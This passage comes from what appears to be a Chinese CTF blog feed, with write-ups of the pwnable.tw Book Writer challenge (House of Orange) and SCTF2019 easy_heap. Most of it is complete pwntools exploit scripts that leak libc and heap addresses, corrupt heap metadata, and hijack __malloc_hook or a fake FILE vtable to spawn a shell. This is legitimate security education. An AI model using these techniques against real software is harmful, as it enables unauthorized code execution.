class="comment">#unsorted bin attack</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#Build(0x50,p64(shell_addr)*10,1,1)#4</span></span><br><span class="line">    payload = p64(system_addr)*<span class="number">10</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x400</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0x1f</span>)+p64(<span class="number">0</span>)+<span class="string">"/bin/sh\x00"</span>+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(io_list_all<span class="number">-0x10</span>)</span><br><span class="line">    payload += p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+<span class="string">'\x00'</span>*<span class="number">0xa8</span></span><br><span class="line">    payload += p64(heap_base+<span class="number">0xd0</span>)</span><br><span class="line">    Upgrade(<span class="number">0x10000</span>,payload,<span class="number">2</span>,<span class="number">2</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice : '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="pwnable-tw-Book-Writer"><a href="#pwnable-tw-Book-Writer" class="headerlink" title="pwnable.tw Book Writer"></a>pwnable.tw Book Writer</h2><h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p>程序有4个功能，Add、View、Edit和Info</p>
<p><img src="/2020/09/03/HouseOfOrange/house_of_orange/6.jpg" alt="menu"></p>
<p>Add可以添加9个chunk，0x6020a0为chunk_list，0x6020e0为chunk_size_list，注意添加chunk的条件是i&gt;8且chunk_list[i]不为NULL，我们的chunk[8]=chunk_size[0]，从而得到一个可读size超大的堆。</p>
<p><img src="/2020/09/03/HouseOfOrange/house_of_orange/7.jpg" alt="Add"></p>
<p>View可以查看堆内容</p>
<p><img src="/2020/09/03/HouseOfOrange/house_of_orange/8.jpg" alt="view"></p>
<p>Edit根据size的大小读取数据，并更新新的size为strlen(content)，这里也有漏洞，当分配0x18的堆块并填充0x18时，content会跟下一个堆块的size连上，strlen的大小会包含size的部分。</p>
<p><img src="/2020/09/03/HouseOfOrange/house_of_orange/9.jpg" alt="edit"></p>
<p>Info函数可以修改author的值，最多可以读取0x40大小，而get_input函数没有给末尾强制加’\x00’，在chunk_list有值之后再修改author可以泄露堆地址。</p>
<p><img src="/2020/09/03/HouseOfOrange/house_of_orange/10.jpg" alt="info"></p>
<p><img src="/2020/09/03/HouseOfOrange/house_of_orange/11.jpg" alt="author"></p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>先利用Edit的溢出漏洞进行house of orange攻击，修改top chunk的size，得到一个Unsorted bin，分配一个large bin,用它泄露堆地址和lib基址(这里其实应该用author那个泄露堆地址，分配large bin的话后面要发送的数据量就太大了)。<br>分配8个堆块，从而可以覆写chunk_list[0]，构造fake_file和fake_vtable，因为是根据strlen的结果修改size_list，我们可以发送数据的前面是’\x00’，这样就会让chunk_size_list[0]被改为0，从而可以malloc一个堆块，最后触发system(“/bin/sh\x00”)拿到shell。<br>exp本地可以，远程失败，原因是刚提到的数据量的问题，懒得改了。</p>
<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./bookwriter'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./bookwriter'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc_64.so.6'</span>)</span><br><span class="line">    libc_offset = <span class="number">0x3c3b20</span></span><br><span class="line">    p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10304</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size of page :"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Content :"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">View</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index of page :"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index of page :"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    p.recvuntil(<span class="string">'Author :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'xmzyshypnc'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size of page :"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">0</span>))<span class="comment">#0</span></span><br><span class="line">    Add(<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">    Edit(<span class="number">1</span>,<span class="string">'b'</span>*<span class="number">0x18</span>)</span><br><span class="line">    Edit(<span class="number">1</span>,<span class="string">'c'</span>*<span class="number">0x18</span>+<span class="string">'\xc1\x0f\x00'</span>)</span><br><span class="line">    Add(<span class="number">0x1000</span>,<span class="string">'d'</span>*<span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x400</span>,<span class="string">'a'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">    View(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Content :\n'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">1640</span> - libc_offset</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    raw_input()</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io_list_all = libc_base + <span class="number">0x3c5520</span></span><br><span class="line">    <span class="comment">#leak heap</span></span><br><span class="line">    Edit(<span class="number">3</span>,<span class="string">'d'</span>*<span class="number">0x10</span>)</span><br><span class="line">    View(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'Content :\n'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'d'</span>*<span class="number">0x10</span>)</span><br><span class="line">    heap_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x40</span></span><br><span class="line">    log.success(<span class="string">'heap base =&gt; '</span> + hex(heap_base))</span><br><span class="line">    raw_input()</span><br><span class="line">    <span class="comment">#overwrite the unsorted bin</span></span><br><span class="line">    Add(<span class="number">0x38</span>,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">    fake_file  = <span class="string">"/bin/sh\x00"</span>+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(io_list_all<span class="number">-0x10</span>)</span><br><span class="line">    fake_file  += p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+<span class="string">'\x00'</span>*<span class="number">0xa8</span></span><br><span class="line">    fake_file  += p64(heap_base+<span class="number">0x470</span>)</span><br><span class="line">    <span class="comment">#Edit(3,fake_file)</span></span><br><span class="line">    <span class="comment">#Edit(3,'B'*0X70+'/bin/sh\x00'+'\x61')</span></span><br><span class="line">    Add(<span class="number">0x10</span>,<span class="string">'a'</span>)<span class="comment">#5</span></span><br><span class="line">    Add(<span class="number">0x10</span>,<span class="string">'a'</span>)<span class="comment">#6</span></span><br><span class="line">    Add(<span class="number">0x10</span>,<span class="string">'a'</span>)<span class="comment">#7</span></span><br><span class="line">    Add(<span class="number">0x10</span>,<span class="string">'b'</span>)<span class="comment">#8</span></span><br><span class="line">    payload = <span class="string">'\x00'</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0x411</span>)</span><br><span class="line">    payload += <span class="string">'a'</span>*<span class="number">0x400</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)</span><br><span class="line">    payload += p64(system_addr)*<span class="number">0xc</span></span><br><span class="line">    payload += (p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">'a'</span>*<span class="number">0x10</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    payload += fake_file</span><br><span class="line">    Edit(<span class="number">0</span>,payload)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size of page :"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">0</span>))<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><p>看p4nda师傅看雪的一篇帖子提到HCTF 2017 有道baby printf也用到了house of orange，且不需要泄露heap地址，直接从libc中找fake vtable，在构造fake file的时候对应偏移修改system地址及参数地址即可，这个方法我尝试在book writer复现，但是libc中没找到所说的vtable，在libc 2.24中找到了，以后需要再搞吧，这里给个链接。</p>
<p><a href="https://bbs.pediy.com/thread-222735.htm" target="_blank" rel="noopener">s1mple</a></p>
]]></content>
      <categories>
        <category>HouseOfOrange</category>
      </categories>
  </entry>
  <entry>
    <title>easy_heap</title>
    <url>/2020/09/03/SCTF2019/easy_heap/</url>
    <content><![CDATA[<h1 id="SCTF2019-easy-heap"><a href="#SCTF2019-easy-heap" class="headerlink" title="SCTF2019 easy_heap"></a>SCTF2019 easy_heap</h1><h2 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h2><p>和姚老板的题完全一样，exp稍微改改就过了</p>
<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Alloc</span><span class="params">(p,size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Address 0x'</span>)</span><br><span class="line">    address = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> address</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(p,index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fill</span><span class="params">(p,index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(p)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Mmap: 0x'</span>)</span><br><span class="line">    map_addr = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">    log.success(<span class="string">'map addr =&gt; '</span> + hex(map_addr))</span><br><span class="line">    code_base = Alloc(p,<span class="number">0x88</span>) - <span class="number">0x202068</span> <span class="comment">#0</span></span><br><span class="line">    chunk_arr = code_base + <span class="number">0x202060</span></span><br><span class="line">    log.success(<span class="string">'program loading base =&gt; '</span> + hex(code_base))</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Alloc(p,<span class="number">0x38</span>)<span class="comment">#1</span></span><br><span class="line">    Alloc(p,<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">    Alloc(p,<span class="number">0xf8</span>)<span class="comment">#3</span></span><br><span class="line">    Alloc(p,<span class="number">0x30</span>)<span class="comment">#4</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Fill(p,<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0x60</span>+p64(<span class="number">0x140</span>))</span><br><span class="line">    Delete(p,<span class="number">0</span>)</span><br><span class="line">    Delete(p,<span class="number">3</span>)</span><br><span class="line">    <span class="comment">#got 0x240 unsorted bin</span></span><br><span class="line"></span><br><span class="line">    Alloc(p,<span class="number">0x88</span>)<span class="comment">#0</span></span><br><span class="line">    Alloc(p,<span class="number">0x50</span>)<span class="comment">#3 overlap 2</span></span><br><span class="line">    Alloc(p,<span class="number">0x48</span>)<span class="comment">#5</span></span><br><span class="line">    Alloc(p,<span class="number">0xf0</span>)<span class="comment">#6</span></span><br><span class="line">    Fill(p,<span class="number">5</span>,<span class="string">'a'</span>*<span class="number">0x40</span>+p64(<span class="number">0x140</span>))</span><br><span class="line">    Delete(p,<span class="number">0</span>)</span><br><span class="line">    Delete(p,<span class="number">6</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Delete(p,<span class="number">2</span>)</span><br><span class="line">    Alloc(p,<span class="number">0xc0</span>)<span class="comment">#0</span></span><br><span class="line">    Alloc(p,<span class="number">0x20</span>)<span class="comment">#2</span></span><br><span class="line">    Alloc(p,<span class="number">0xf0</span>)<span class="comment">#6</span></span><br><span class="line">    Alloc(p,<span class="number">0x30</span>)<span class="comment">#7</span></span><br><span class="line">    Delete(p,<span class="number">3</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25\n'</span></span><br><span class="line">    Alloc(p,<span class="number">0x50</span>)<span class="comment">#3</span></span><br><span class="line">    Fill(p,<span class="number">3</span>,payload)</span><br><span class="line">    log.success(<span class="string">'ready to malloc fake chunk'</span>)</span><br><span class="line">    Alloc(p,<span class="number">0x60</span>)<span class="comment">#8</span></span><br><span class="line">    Alloc(p,<span class="number">0x60</span>)<span class="comment">#9</span></span><br><span class="line">    Fill(p,<span class="number">9</span>,<span class="string">'\x00'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'\x00\x18\xad\xfb'</span>)</span><br><span class="line">    p.recvn(<span class="number">28</span>)</span><br><span class="line">    libc_addr = u64(p.recvn(<span class="number">8</span>))</span><br><span class="line">    log.info(<span class="string">'libc addr =&gt; '</span> + hex(libc_addr))</span><br><span class="line">    libc_base = libc_addr - <span class="number">0x3c5600</span></span><br><span class="line">    log.info(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    target_addr = libc_base + malloc_hook - <span class="number">0x23</span></span><br><span class="line">    log.success(<span class="string">'malloc hook addr =&gt; '</span> + hex(target_addr))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">2</span>]</span><br><span class="line">    Alloc(p,<span class="number">0x10</span>)<span class="comment">#10</span></span><br><span class="line">    Alloc(p,<span class="number">0xf0</span>)<span class="comment">#11</span></span><br><span class="line">    Delete(p,<span class="number">10</span>)</span><br><span class="line">    log.info(<span class="string">'before to overwrite next chunk'</span>)</span><br><span class="line">    Alloc(p,<span class="number">0x18</span>)<span class="comment">#10</span></span><br><span class="line">    Fill(p,<span class="number">10</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0x60</span>))</span><br><span class="line">    <span class="comment">#fast bin attack,modify __malloc_hook</span></span><br><span class="line">    Delete(p,<span class="number">8</span>)</span><br><span class="line">    Delete(p,<span class="number">3</span>)</span><br><span class="line">    Alloc(p,<span class="number">0x50</span>)<span class="comment">#3</span></span><br><span class="line">    Fill(p,<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(target_addr)+<span class="string">'\n'</span>)</span><br><span class="line">    Alloc(p,<span class="number">0x60</span>)<span class="comment">#8</span></span><br><span class="line">    payload = <span class="string">'\x00'</span>*<span class="number">0x13</span> + p64(shell_addr) + <span class="string">'\n'</span></span><br><span class="line"></span><br><span class="line">    Alloc(p,<span class="number">0x60</span>)<span class="comment">#9</span></span><br><span class="line">    Fill(p,<span class="number">12</span>,payload)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment">#trigger</span></span><br><span class="line"></span><br><span class="line">    Delete(p,<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./easy_heap'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'47.104.89.129'</span>,<span class="number">10004</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">exp(p)</span><br></pre></td></tr></table></figure>
<h2 id="解法2-17"><a href="#解法2-17" class="headerlink" title="解法2(17)"></a>解法2(17)</h2><p>这个exp更舒服一点，比较好理解<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">Alloc(p,<span class="number">0x88</span>)<span class="comment">#0</span></span><br><span class="line">Alloc(p,<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">Alloc(p,<span class="number">0xf8</span>)<span class="comment">#2</span></span><br><span class="line">Alloc(p,<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Delete(p,<span class="number">0</span>)</span><br><span class="line">Fill(p,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x60</span>+p64(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">Delete(p,<span class="number">2</span>)</span><br><span class="line">Delete(p,<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
<p>首先分配几个堆块，把第0个free掉，Edit(1)修改chunk2的prev_size和size，再释放chunk2，0-2合并成一个大的unsorted bin。</p>
<p>Delete(1)让chunk1进入fastbin[0x70]，Alloc(0x88)让fastbin的fd和bk被写入main_arena+88。注意此时这个fastbin存在size error，直接从中分配chunk会报错。这时候我们再Free掉刚才的chunk0，再分配一次构造overlapping chunk可以修改fastbin的size为正确的值，从而可以分配fastbin的chunk再部分写泄露libc。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">Alloc(p,<span class="number">0x88</span>)<span class="comment">#0</span></span><br><span class="line">Delete(p,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#overwrite the size to 0x70</span></span><br><span class="line">Alloc(p,<span class="number">0x58</span>)<span class="comment">#0</span></span><br><span class="line">Alloc(p,<span class="number">0x98</span>)<span class="comment">#1</span></span><br><span class="line">Fill(p,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25\n'</span>)</span><br><span class="line">Alloc(p,<span class="number">0x60</span>)<span class="comment">#2</span></span><br><span class="line">Alloc(p,<span class="number">0x60</span>)<span class="comment">#4 stdout</span></span><br><span class="line">Fill(p,<span class="number">4</span>,<span class="string">'\x00'</span>*<span class="number">51</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line">p.recvn(<span class="number">0x40</span>)</span><br><span class="line">libc_bse = u64(p.recv(<span class="number">8</span>)) - <span class="number">3954176</span></span><br></pre></td></tr></table></figure>
<p>Delete(2)让0x70的块再次进入fastbin，Delete(1)再分配chunk溢出修改fastbin的fd(刚才的套路)，两次分配就可以分配到fake_chunk，继而修改成shell_addr。</p>
<p>最后Malloc触发malloc_hook不好使，这里free(2)和free(5)触发错误调用malloc_hook拿到shell</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">Delete(p,<span class="number">2</span>)<span class="comment">#into 0x70 fast bins</span></span><br><span class="line">Delete(p,<span class="number">1</span>)</span><br><span class="line">Alloc(p,<span class="number">0x70</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Fill(p,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x71</span>)+p64(fake_chunk)*<span class="number">2</span>+<span class="string">'\n'</span>)</span><br><span class="line">Alloc(p,<span class="number">0x60</span>)<span class="comment">#2</span></span><br><span class="line">Alloc(p,<span class="number">0x60</span>)<span class="comment">#5</span></span><br><span class="line">Fill(p,<span class="number">5</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(shell_addr)+<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/03/SCTF2019/easy_heap/1.jpg" alt="heap_list"></p>
<h3 id="17-py"><a href="#17-py" class="headerlink" title="17.py"></a>17.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Alloc</span><span class="params">(p,size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Address 0x'</span>)</span><br><span class="line">    address = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> address</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(p,index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fill</span><span class="params">(p,index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(p)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Mmap: 0x'</span>)</span><br><span class="line">    map_addr = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">    log.success(<span class="string">'map addr =&gt; '</span> + hex(map_addr))</span><br><span class="line">    code_base = Alloc(p,<span class="number">0x88</span>) - <span class="number">0x202068</span> <span class="comment">#0</span></span><br><span class="line">    chunk_arr = code_base + <span class="number">0x202060</span></span><br><span class="line">    log.success(<span class="string">'program loading base =&gt; '</span> + hex(code_base))</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Alloc(p,<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">    Alloc(p,<span class="number">0xf8</span>)<span class="comment">#2</span></span><br><span class="line">    Alloc(p,<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(p,<span class="number">0</span>)</span><br><span class="line">    Fill(p,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x60</span>+p64(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">    Delete(p,<span class="number">2</span>)</span><br><span class="line">    Delete(p,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    Alloc(p,<span class="number">0x88</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(p,<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#overwrite the size to 0x70</span></span><br><span class="line">    Alloc(p,<span class="number">0x58</span>)<span class="comment">#0</span></span><br><span class="line">    Alloc(p,<span class="number">0x98</span>)<span class="comment">#1</span></span><br><span class="line">    Fill(p,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25\n'</span>)</span><br><span class="line">    Alloc(p,<span class="number">0x60</span>)<span class="comment">#2</span></span><br><span class="line">    Alloc(p,<span class="number">0x60</span>)<span class="comment">#4 stdout</span></span><br><span class="line">    Fill(p,<span class="number">4</span>,<span class="string">'\x00'</span>*<span class="number">51</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line">    p.recvn(<span class="number">0x40</span>)</span><br><span class="line">    libc_bse = u64(p.recv(<span class="number">8</span>)) - <span class="number">3954176</span></span><br><span class="line">    log.success(<span class="string">'lib base =&gt; '</span> + hex(libc_bse))</span><br><span class="line">    malloc_hook = libc_bse + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    fake_chunk = malloc_hook - <span class="number">35</span></span><br><span class="line">    shell_addr = libc_bse+gadgets[<span class="number">2</span>]</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span 